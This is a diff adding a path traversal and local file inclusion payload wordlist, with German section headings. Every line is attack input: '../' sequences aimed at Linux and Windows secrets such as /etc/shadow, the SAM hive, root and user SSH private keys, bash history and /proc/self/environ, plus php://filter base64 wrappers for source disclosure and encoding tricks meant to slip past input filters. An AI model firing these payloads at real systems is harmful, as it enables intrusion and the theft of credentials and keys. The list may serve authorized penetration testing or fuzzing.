@@ -1,0 +1,83 @@
+# Linux-Systemdateien
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/issue
+../../../../../../etc/group
+../../../../../../etc/hostname
+../../../../../../etc/hosts
+../../../../../../etc/resolv.conf
+../../../../../../etc/fstab
+../../../../../../etc/cron.d
+../../../../../../etc/crontab
+../../../../../../etc/profile
+../../../../../../etc/bash.bashrc
+../../../../../../etc/ssh/ssh_config
+../../../../../../etc/ssh/sshd_config
+../../../../../../etc/mysql/my.cnf
+../../../../../../etc/httpd/conf/httpd.conf
+../../../../../../etc/apache2/apache2.conf
+../../../../../../etc/apache2/sites-available/000-default.conf
+../../../../../../etc/php/7.4/apache2/php.ini
+../../../../../../etc/php.ini
+
+# Linux-Logs
+../../../../../../var/log/auth.log
+../../../../../../var/log/syslog
+../../../../../../var/log/messages
+../../../../../../var/log/dmesg
+../../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache2/error.log
+../../../../../../var/log/httpd/access_log
+../../../../../../var/log/httpd/error_log
+../../../../../../var/log/mysql/error.log
+
+# Linux-Prozesse/Kernel
+../../../../../../proc/version
+../../../../../../proc/cmdline
+../../../../../../proc/mounts
+../../../../../../proc/self/environ
+../../../../../../proc/self/status
+../../../../../../proc/net/tcp
+../../../../../../proc/net/udp
+
+# Root/Benutzerspezifisch
+../../../../../../root/.bash_history
+../../../../../../root/.ssh/id_rsa
+../../../../../../home/user/.bashrc
+../../../../../../home/user/.ssh/id_rsa
+../../../../../../home/user/.bash_history
+
+# Webserver-spezifisch
+../../../../../../var/www/html/index.php
+../../../../../../var/www/html/config.php
+../../../../../../srv/www/htdocs/index.php
+
+# Windows-Systemdateien
+../../../../../../boot.ini
+../../../../../../windows/win.ini
+../../../../../../windows/system.ini
+../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../windows/system32/config/systemprofile/NTUSER.DAT
+../../../../../../windows/system32/config/sam
+../../../../../../windows/system32/config/system
+../../../../../../windows/system32/config/software
+../../../../../../windows/system32/config/security
+../../../../../../windows/system32/cmd.exe
+../../../../../../windows/system32/inetsrv/config/applicationHost.config
+
+# Windows-Logs
+../../../../../../windows/debug/NetSetup.log
+../../../../../../windows/system32/logfiles/httperr/httperr1.log
+../../../../../../windows/system32/logfiles/w3svc1/u_exYYMMDD.log
+
+# PHP Filter Tricks (Base64-Encoding umgehen)
+php://filter/convert.base64-encode/resource=../../../../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../../../../etc/shadow
+php://filter/convert.base64-encode/resource=../../../../../../var/www/html/index.php
+
+# Spezialtricks & Variationen
+....//....//....//....//etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%c0%af../..%c0%af../etc/passwd
